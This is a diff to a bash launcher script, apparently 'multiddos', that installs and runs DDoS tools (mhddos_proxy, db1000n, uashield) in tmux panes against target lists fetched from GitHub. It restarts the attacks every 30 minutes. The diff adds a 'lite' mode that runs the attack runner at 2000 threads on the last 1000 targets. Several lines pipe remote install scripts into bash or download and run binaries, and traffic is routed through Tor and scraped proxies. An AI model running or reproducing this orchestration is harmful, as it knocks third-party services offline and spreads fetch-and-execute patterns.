@@ -1,10 +1,9 @@
 #!/bin/bash
-# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh && tmux a
+# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/multiddos.sh && bash multiddos.sh && tmux a
 
 clear && echo -e "Loading...\n"
 
 sudo apt-get update -q -y #>/dev/null 2>&1
-# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
 
@@ -49,10 +48,9 @@ prepare_targets_and_banner () {
 export targets_curl="/var/tmp/curl.uaripper"
 export targets_line_by_line="/var/tmp/line_by_line.uaripper"
 export targets_uniq="/var/tmp/uniq.uaripper"
+export targets_lite="/var/tmp/lite.uaripper"
 export t1="/var/tmp/xaa.uaripper"
 export t2="/var/tmp/xab.uaripper"
-export t3="/var/tmp/xac.uaripper"
-export t4="/var/tmp/xad.uaripper"
 rm -f /var/tmp/*uaripper #remove previous copies
 
 # read targets from github and put them in file $targets_curl. Commented and empty lines excluded.
@@ -121,25 +119,29 @@ else
 fi
 
 if [[ $vnstat == "on" ]]; then
-sudo apt -yq install vnstat
-sleep 0.2
-tmux split-window -v 'vnstat -l'
+    sudo apt -yq install vnstat
+    sleep 0.2
+    tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
-sudo apt -yq install torsocks
-sleep 0.2
-tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
+    sudo apt -yq install torsocks
+    sleep 0.2
+    tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
 if [[ $uashield == "on" ]]; then
-sleep 0.2
-tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
+    sleep 0.2
+    tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
 if [[ $proxy_finder == "on" ]]; then
-sleep 0.2
-tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Шукаю нові проксі... Proxy threads:" $proxy_threads; echo -e "\x1b[32mВ середньому одна робоча проксі знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py --threads $proxy_threads'
+    sleep 0.2
+    if [[ $proxy_threads == "" ]]; then
+        tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Шукаю нові проксі... Proxy threads:" $proxy_threads; echo -e "\x1b[32mВ середньому одна робоча проксі знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py'
+    else
+        tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Шукаю нові проксі... Proxy threads:" $proxy_threads; echo -e "\x1b[32mВ середньому одна робоча проксі знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
+    fi
 fi
 
 #tmux -2 attach-session -d
@@ -169,6 +171,7 @@ while [ "$1" != "" ]; do
         -t | --threads )   export threads="-t $2"; t_set_manual="on"; shift 2 ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
+         --lite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p0| --no-proxy-finder ) export proxy_finder="off"; shift ;;
         -p | --proxy-threads ) export proxy_threads="$2"; shift 2 ;;
         --no-uvloop ) export uvloop="off"; shift ;;
@@ -213,7 +216,11 @@ fi
 
 # Restart attacks and update targets every 30 minutes
 while true; do
-        pkill -f start.py; pkill -f runner.py 
+    pkill -f start.py; pkill -f runner.py
+    if [[ $lite == "on" ]]; then
+        tail -n 1000 $targets_uniq > $targets_lite
+        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods -t 2000 &
+    else
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
         sleep 10 # to decrease load on cpu during simultaneous start
         python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
@@ -221,6 +228,7 @@ while true; do
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
+    fi
 sleep 30m
 prepare_targets_and_banner
 done
